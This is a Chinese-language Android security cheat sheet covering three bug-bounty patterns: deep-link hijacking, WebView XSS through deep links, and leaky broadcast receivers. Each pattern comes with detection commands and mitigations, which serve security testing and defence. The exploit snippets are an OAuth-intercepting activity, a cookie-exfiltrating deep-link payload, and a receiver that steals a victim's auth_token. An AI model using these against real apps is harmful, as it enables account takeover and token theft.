# Android 深链劫持与广播接收器攻击 (2024-2026 赏金模式)

> 来源提炼: hardw00t/ai-security-arsenal (android-pentest bounty_patterns_2024_2026)

## 模式索引

| # | 模式 | 严重度 | 来源 |
|---|------|--------|------|
| P34 | intent-filter 注册导致的深链劫持 | Critical | Android docs · USENIX |
| P36a | 不安全深链 URL 加载导致的 WebView XSS/RCE | Critical | 8kSec 2024-2025 |
| P37 | 无保护广播接收器元数据泄漏 | High | 移动审计 2024-2025 |

## P34. 深链劫持 (intent-filter 注册)

多个应用可注册相同自定义 scheme(`myapp://`)或相同 http host。恶意应用先注册(或更高优先级)拦截 OAuth 回调、支付深链、找回密码链接，导致账户接管。仅 2.2% 应用通过 App Links 验证。

检测:

```bash
apkanalyzer manifest print app.apk | grep -E '<intent-filter|<data|android:scheme|android:host|android:autoVerify'
curl -sSf https://host.tld/.well-known/assetlinks.json | jq .
```

重点: `<intent-filter>` 匹配 OAuth/支付/重置 URI 但 `android:autoVerify="false"` 或缺失；深链处理器读 `getIntent().getData()` 未校验 caller UID/签名。

利用:

```xml
<activity android:name=".Grab" android:exported="true">
  <intent-filter android:priority="999">
    <action android:name="android.intent.action.VIEW"/>
    <category android:name="android.intent.category.DEFAULT"/>
    <category android:name="android.intent.category.BROWSABLE"/>
    <data android:scheme="victimapp" android:host="oauth"/>
  </intent-filter>
</activity>
```

缓解: App Links + 已验证 `assetlinks.json`、`autoVerify="true"`、activity 内校验 `getCallingPackage()`/签名、OAuth 走 Custom Tabs。

## P36a. WebView XSS 经不安全深链

深链参数直接进 `WebView.loadUrl()` / `loadData()` / `loadDataWithBaseURL()` 未清洗 → HTML 注入/XSS；`setJavaScriptEnabled(true)` + `addJavascriptInterface` 时经 JS 桥反射 RCE。

检测:

```bash
apktool d app.apk -o out
grep -RnE 'loadUrl|loadData|loadDataWithBaseURL|addJavascriptInterface|setJavaScriptEnabled' out/smali*
adb shell am start -W -a android.intent.action.VIEW -d 'myapp://browse?url=javascript:alert(document.cookie)'
```

利用: `myapp://in-app-browser?url=data:text/html,<script>AndroidBridge.exfil(document.cookie)</script>`

缓解: loadUrl 前严格 allow-list、丢弃 `javascript:`/`data:`/`file:` scheme、非必要 `setJavaScriptEnabled(false)`、审查 `@JavascriptInterface` 暴露方法。

## P37. 无保护广播接收器元数据泄漏

`exported="true"`(显式或 pre-Android 12 隐式)且无 `android:permission` 的 receiver 向任何注册匹配 action 的应用泄漏 auth token、refresh token、设备 ID、推送元数据。

检测:

```bash
apkanalyzer manifest print app.apk | python3 -c '
import sys, re
for m in re.finditer(r"<receiver[^/]*?/>|<receiver.*?</receiver>", sys.stdin.read(), re.S):
    t = m.group(0)
    if "exported=\"true\"" in t and "android:permission" not in t:
        print(t)'
```

利用:

```java
registerReceiver(new BroadcastReceiver() {
  @Override public void onReceive(Context c, Intent i) {
    Log.d("PWN", i.getStringExtra("auth_token"));
  }
}, new IntentFilter("com.victim.ACTION_LEAK"));
```

缓解: 非必要 `exported="false"`、signature 级 `android:permission`、进程内用 `LocalBroadcastManager`/Flow/LiveData、target SDK ≥ 31。

## 交叉引用

- MASTG-TEST-0032/0034/0035/0037/0039
- CWE-79 / 200 / 749 / 926 / 927